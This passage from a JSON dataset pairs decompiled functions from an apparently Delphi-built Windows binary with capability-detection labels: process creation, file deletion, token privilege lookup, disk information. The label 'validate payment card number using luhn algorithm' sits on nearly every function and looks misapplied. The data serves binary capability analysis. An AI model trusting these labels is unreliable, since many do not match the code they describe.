            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048d970(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    puStack28 = 0x48d981;\n    fcn.004058ec();\n    uStack32 = 0x48da0a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48d99b;\n    puStack28 = &stack0xfffffffc;\n    var_14h = fcn.00404610();\n    uStack44 = 0x48d9ed;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    cVar1 = fcn.0040a168();\n    if (cVar1 == '\\0') {\n        fcn.00404f60();\n        *in_FS_OFFSET = uStack48;\n        puStack40 = 0x48da11;\n        uStack44 = 0x48da09;\n        fcn.0040546c();\n        return;\n    }\n    fcn.0041bc0c();\n    _var_10h = (***var_14h)();\n    *in_FS_OFFSET = uStack48;\n    puStack40 = 0x48d9f4;\n    uStack44 = 0x48d9ec;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 394
    },
    "0048da1c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048da1c(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint pExecInfo;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_24h;\n    uint var_4h;\n    \n    puStack80 = 0x48da31;\n    var_4h = param_2;\n    fcn.004058ec();\n    uStack84 = 0x48daa8;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack80 = &stack0xfffffffc;\n    fcn.00403ae4();\n    pExecInfo = 0x3c;\n    var_3ch = 0x500;\n    var_30h = fcn.004058fc();\n    var_34h = 0x48dab8;\n    var_2ch = 0x48dac0;\n    var_24h = 1;\n    sub.shell32.dll_ShellExecuteExA();\n    *in_FS_OFFSET = &fcn.0048da1c::pExecInfo;\n    uStack84 = 0x48daaf;\n    iStack88 = 0x48daa7;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 334
    },
    "0048dac4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048dac4(uint param_1, int32_t param_2)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack512;\n    uint uStack508;\n    uchar *puStack504;\n    uint uStack500;\n    uint uStack496;\n    uchar *puStack492;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack504 = &stack0xfffffffc;\n    puStack492 = 0x48dae8;\n    fcn.004058ec();\n    uStack496 = 0x48dbbb;\n    uStack500 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe0c;\n    uStack508 = 0x48db84;\n    uStack512 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe00;\n    puStack492 = &stack0xfffffffc;\n    fcn.0040546c();\n    fcn.00403760();\n    fcn.004034fc();\n    fcn.004033a8();\n    param_2 = param_2 + -2;\n    if (0 < param_2) {\n        do {\n            fcn.004033d0();\n            fcn.00405654();\n            fcn.00405738();\n            param_2 = param_2 + -1;\n        } while (param_2 != 0);\n    }\n    fcn.00405bf0();\n    fcn.0040409c();\n    fcn.00403908();\n    *in_FS_OFFSET = uStack512;\n    *in_FS_OFFSET = uStack500;\n    puStack492 = 0x48dbc2;\n    uStack496 = 0x48dbad;\n    fcn.0040546c();\n    uStack496 = 0x48dbba;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 427
    },
    "0048dbcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048dbcc(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_28h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack52 = 0x48dbe3;\n    fcn.004058ec();\n    uStack56 = 0x48dc54;\n    iStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00403ae4();\n    var_1eh = 3;\n    fcn.00405784();\n    var_1ah = fcn.004058fc();\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.0048dbcc::lpFileOp;\n    uStack56 = 0x48dc5b;\n    iStack60 = 0x48dc4b;\n    fcn.0040546c();\n    iStack60 = 0x48dc53;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 303
    },
    "0048df30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048df30(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x48df40;\n    fcn.004058ec();\n    uStack20 = 0x48df96;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    fcn.0042104c();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x48df9d;\n    uStack20 = 0x48df95;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 196
    },
    "0048dfe4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048dfe4(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48dff9;\n    fcn.004058ec();\n    puStack20 = 0x48e001;\n    fcn.004058ec();\n    uStack24 = 0x48e061;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00420b38();\n    fcn.00420c14();\n    fcn.00420d58();\n    uVar1 = 1;\n    fcn.00421c8c(1);\n    *in_FS_OFFSET = uVar1;\n    uStack24 = 0x48e068;\n    uStack28 = 0x48e060;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 239
    },
    "0048e0b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048e0b0(void)\n\n{\n    char cVar1;\n    int32_t *piVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48e0c4;\n    fcn.004058ec();\n    uStack24 = 0x48e14a;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x48e0d9;\n    puStack20 = &stack0xfffffffc;\n    fcn.0040546c();\n    puStack32 = 0x48e0e1;\n    cVar1 = fcn.0040a168();\n    if (cVar1 != '\\0') {\n        uStack36 = 0x48e12d;\n        uStack40 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffd8;\n        puStack32 = &stack0xfffffffc;\n        piVar2 = fcn.00404610();\n        (**(*piVar2 + 0x68))();\n        (**(*piVar2 + 0x1c))();\n        *in_FS_OFFSET = uStack40;\n        puStack32 = 0x48e134;\n        uStack36 = 0x48e12c;\n        fcn.00404640();\n        return;\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x48e151;\n    uStack24 = 0x48e149;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 400
    },
    "0048e158": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "delete file"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e158(uint param_1, uint param_2)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    int32_t *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    puStack20 = 0x48e16c;\n    var_8h = param_2;\n    fcn.004058ec();\n    puStack20 = 0x48e174;\n    fcn.004058ec();\n    uStack24 = 0x48e207;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uStack36 = 0x48e1e5;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack44 = 0x48e198;\n    puStack20 = &stack0xfffffffc;\n    cVar1 = fcn.0040a168();\n    if (cVar1 != '\\0') {\n        uStack44 = fcn.004058fc();\n        sub.kernel32.dll_DeleteFileA();\n    }\n    var_ch = fcn.00404610();\n    (**(*var_ch + 0x2c))();\n    (**(*var_ch + 0x74))();\n    *in_FS_OFFSET = uStack44;\n    uStack36 = 0x48e1ec;\n    uStack40 = 0x48e1e4;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 391
    },
    "0048e214": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048e214(void)\n\n{\n    uint *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint ReturnLength;\n    int32_t *TokenInformation;\n    uint TokenHandle;\n    uint *var_4h;\n    \n    puStack60 = &stack0xfffffffc;\n    uStack64 = 0x48e360;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack68;\n    var_4h = in_EAX;\n    fcn.0040546c();\n    TokenInformation = fcn.00402ef0();\n    uVar1 = sub.kernel32.dll_GetCurrentProcess(0x28, &TokenHandle);\n    iVar2 = sub.advapi32.dll_OpenProcessToken(uVar1);\n    if (iVar2 == 0) {\n        fcn.0048d258();\n    }\n    iVar2 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, TokenInformation, 800, &ReturnLength);\n    if (iVar2 == 0) {\n        fcn.0048d258();\n    }\n    uVar1 = fcn.00402ef0();\n    uVar3 = fcn.00402ef0();\n    iVar2 = *TokenInformation;\n    if (-1 < iVar2 + -1) {\n        var_14h = 0;\n        do {\n            var_1ch = 0xff;\n            var_18h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, TokenInformation + var_14h * 3 + 1, uVar1, &var_18h);\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA(0, uVar1, uVar3, &var_1ch, &var_20h);\n            fcn.00405664(*var_4h);\n            fcn.00405664(0x48e3bc, 0);\n            TokenHandle = 0x48e3c8;\n            fcn.00405800();\n            var_14h = var_14h + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00402f0c();\n    fcn.00402f0c();\n    fcn.00402f0c();\n    *in_FS_OFFSET = TokenHandle;\n    fcn.00405490(0x48e367);\n    return;\n}\n",
        "token_count": 616
    },
    "0048e5e8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop",
            "get token privileges"
        ],
        "decompiled_code": "\nvoid fcn.0048e5e8(void)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack100;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x48e6f3;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    piVar1 = fcn.00402ef0();\n    uVar2 = sub.kernel32.dll_GetCurrentProcess(0x28, &fcn.0048e5e8::TokenHandle);\n    iVar3 = sub.advapi32.dll_OpenProcessToken(uVar2);\n    if (iVar3 == 0) {\n        sub.kernel32.dll_Sleep_1(1);\n    }\n    uStack100 = 0x48e641;\n    iVar3 = sub.advapi32.dll_GetTokenInformation(TokenHandle, 3, piVar1, 800, &fcn.0048e5e8::ReturnLength);\n    if (iVar3 == 0) {\n        uStack100 = 1;\n        sub.kernel32.dll_Sleep_1();\n    }\n    uVar2 = fcn.00402ef0();\n    var_10h = fcn.00402ef0();\n    iVar3 = *piVar1;\n    if (-1 < iVar3 + -1) {\n        var_ch = 0;\n        do {\n            var_14h = 0xff;\n            sub.advapi32.dll_LookupPrivilegeNameA(0, piVar1 + var_ch * 3 + 1, uVar2, &fcn.0048e5e8::var_14h);\n            uStack100 = 0;\n            sub.advapi32.dll_LookupPrivilegeDisplayNameA();\n            fcn.00405664();\n            fcn.0048e4a8();\n            var_ch = var_ch + 1;\n            iVar3 = iVar3 + -1;\n        } while (iVar3 != 0);\n    }\n    fcn.00402f0c();\n    fcn.00402f0c();\n    fcn.00402f0c();\n    *in_FS_OFFSET = uStack100;\n    fcn.0040546c(0x48e6fa);\n    return;\n}\n",
        "token_count": 581
    },
    "0048e7f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048e7f8(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x48e80f;\n    fcn.004058ec();\n    uStack32 = 0x48e8dd;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    puStack40 = 0x48e825;\n    puStack28 = &stack0xfffffffc;\n    fcn.0040546c();\n    uStack44 = 0x48e8b5;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack40 = &stack0xfffffffc;\n    fcn.00420b7c();\n    fcn.00420c14();\n    fcn.00420d58();\n    cVar1 = fcn.00421780();\n    if (cVar1 == '\\0') {\n        fcn.0040546c();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00420d58();\n        cVar1 = fcn.004216d8();\n        if (cVar1 != '\\0') {\n            fcn.004214dc();\n        }\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48e8e4;\n    uStack32 = 0x48e8dc;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 396
    },
    "0048e914": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048e914(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48e92b;\n    fcn.004058ec();\n    puStack28 = 0x48e933;\n    fcn.004058ec();\n    uStack32 = 0x48e9f3;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48e9c7;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420b7c();\n    fcn.00420c14();\n    fcn.00420d58();\n    cVar1 = fcn.00421780();\n    if (cVar1 == '\\0') {\n        fcn.00420c7c();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00420d58();\n        fcn.0042147c();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48e9fa;\n    uStack32 = 0x48e9f2;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 369
    },
    "0048f134": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\nvoid fcn.0048f134(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = 0x48f144;\n    fcn.004058ec();\n    uStack20 = 0x48f17c;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(2);\n    uVar2 = 0x14;\n    sub.user32.dll_SystemParametersInfoA(0x14, 0, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x48f183);\n    return;\n}\n",
        "token_count": 199
    },
    "0048f52c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048f52c(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = 4;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    fcn.00409c6c();\n    return;\n}\n",
        "token_count": 65
    },
    "0048f554": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048f554(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = 0x48f56b;\n    fcn.004058ec();\n    uStack36 = 0x48f65c;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack44 = 0x48f581;\n    puStack32 = &stack0xfffffffc;\n    fcn.0040546c();\n    uStack48 = 0x48f627;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack44 = &stack0xfffffffc;\n    fcn.00420b7c();\n    fcn.00420c14();\n    fcn.00420d58();\n    cVar1 = fcn.00421780();\n    if (cVar1 == '\\0') {\n        fcn.0040546c();\n        *in_FS_OFFSET = uStack52;\n    }\n    else {\n        fcn.00420d58();\n        cVar1 = fcn.004216d8();\n        if (cVar1 == '\\0') {\n            fcn.004054c0();\n        }\n        else {\n            fcn.004214dc();\n        }\n        *in_FS_OFFSET = uStack52;\n        puStack44 = 0x48f646;\n        fcn.00404640();\n    }\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x48f663;\n    uStack36 = 0x48f65b;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 429
    },
    "0048f6a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048f6a4(void)\n\n{\n    char cVar1;\n    uint *in_FS_OFFSET;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    puStack28 = 0x48f6bb;\n    fcn.004058ec();\n    puStack28 = 0x48f6c3;\n    fcn.004058ec();\n    uStack32 = 0x48f78a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    uStack44 = 0x48f75e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack28 = &stack0xfffffffc;\n    fcn.00420b7c();\n    fcn.00420c14();\n    fcn.00420d58();\n    cVar1 = fcn.00421780();\n    if (cVar1 == '\\0') {\n        fcn.00420c7c();\n        *in_FS_OFFSET = uStack48;\n    }\n    else {\n        fcn.00420d58();\n        fcn.0042147c();\n        fcn.00404640();\n        *in_FS_OFFSET = uStack48;\n    }\n    *in_FS_OFFSET = uStack36;\n    puStack28 = 0x48f791;\n    uStack32 = 0x48f789;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 376
    },
    "0048f908": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048f908(void)\n\n{\n    uint *in_FS_OFFSET;\n    float10 fVar1;\n    uint uVar2;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint hObject;\n    uint var_8h;\n    uint var_4h;\n    double dVar3;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack32 = 0x48f91f;\n    fcn.004058ec();\n    puStack32 = 0x48f927;\n    fcn.004058ec();\n    uStack36 = 0x48f9d3;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uStack48 = 0x48f9a7;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x48f950;\n    puStack32 = &stack0xfffffffc;\n    fcn.0040a068();\n    uStack60 = 0x48f996;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &stack0xfffffffc;\n    fVar1 = fcn.0040d114();\n    dVar3 = fVar1;\n    fcn.0040a6b8(SUB84(dVar3, 0), dVar3 >> 0x20);\n    uVar2 = SUB84(dVar3, 0);\n    fcn.0040a2a8();\n    *in_FS_OFFSET = uVar2;\n    uStack64 = 0x48f99d;\n    sub.kernel32.dll_CloseHandle_1();\n    return;\n}\n",
        "token_count": 430
    },
    "0048f9e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048f9e4(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = 0x48fa01;\n    fcn.00405f08();\n    uStack24 = 0x48fa73;\n    iStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack20 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    iStack32 = fcn.004058fc();\n    iVar1 = sub.kernel32.dll_LoadLibraryA();\n    if (iVar1 != 0) {\n        pcVar2 = sub.kernel32.dll_GetProcAddress_1(iVar1, 0x48fa84);\n        (*pcVar2)();\n        sub.kernel32.dll_FreeLibrary_1();\n        iStack32 = iVar1;\n    }\n    *in_FS_OFFSET = iStack32;\n    uStack24 = 0x48fa7a;\n    iStack28 = 0x48fa64;\n    fcn.0040546c();\n    iStack28 = 0x48fa72;\n    fcn.00405fd8();\n    return;\n}\n",
        "token_count": 323
    },
    "0048fc18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0048fc18(void)\n\n{\n    int32_t *in_FS_OFFSET;\n    int32_t iStack332;\n    uint uStack328;\n    uchar *puStack324;\n    int32_t iStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_122h;\n    uint lpFileOp;\n    uint var_1eh;\n    uint *var_1ah;\n    uint var_12h;\n    uint var_4h;\n    \n    puStack324 = &stack0xfffffffc;\n    puStack312 = 0x48fc2f;\n    fcn.004058ec();\n    uStack316 = 0x48fcd9;\n    iStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uStack328 = 0x48fcb7;\n    iStack332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffeb4;\n    puStack312 = &stack0xfffffffc;\n    fcn.00403ae4();\n    fcn.00403ae4();\n    fcn.0040a824();\n    lpFileOp = 0;\n    var_1ah = &fcn.0048fc18::var_122h;\n    var_1eh = 3;\n    var_12h._0_2_ = 0x54;\n    sub.shell32.dll_SHFileOperationA();\n    *in_FS_OFFSET = &fcn.0048fc18::lpFileOp;\n    *in_FS_OFFSET = puStack324;\n    uStack316 = 0x48fce0;\n    iStack320 = 0x48fcd8;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 386
    },
    "00490028": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get disk information"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00490028(uint param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint uStack308;\n    uint uStack304;\n    uchar *puStack300;\n    uint var_115h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack312 = &stack0xfffffffc;\n    puStack300 = 0x490042;\n    var_8h = param_2;\n    fcn.004058ec();\n    uStack304 = 0x4900cf;\n    uStack308 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffecc;\n    uStack316 = 0x4900a2;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack300 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(0, 0, 0, &fcn.00490028::var_ch, &fcn.00490028::var_10h, &fcn.00490028::var_115h, 0x105);\n    iVar2 = sub.kernel32.dll_GetVolumeInformationA();\n    if (iVar2 != 0) {\n        fcn.0040a9a4();\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = uVar3;\n    fcn.0040546c(0x4900d6);\n    return;\n}\n",
        "token_count": 384
    },
    "004900f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004900f0(uint param_1, char param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    puStack44 = 0x490109;\n    fcn.004058ec();\n    uStack48 = 0x4901a6;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x490179;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack44 = &stack0xfffffffc;\n    uVar1 = fcn.004058fc(&fcn.004900f0::var_10h, &fcn.004900f0::var_18h);\n    iVar2 = (***0x4a4dc4)();\n    if (iVar2 != 0) {\n        if (param_2 == '\\0') {\n            fcn.0048f81c(SUB108(_var_10h, 0), _var_10h >> 0x40);\n        }\n        else {\n            fcn.0048f81c(SUB108(_var_18h, 0), _var_18h >> 0x40);\n        }\n    }\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = 0;\n    uStack60 = 0x4901ad;\n    uStack64 = 0x4901a5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 421
    },
    "0049047c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
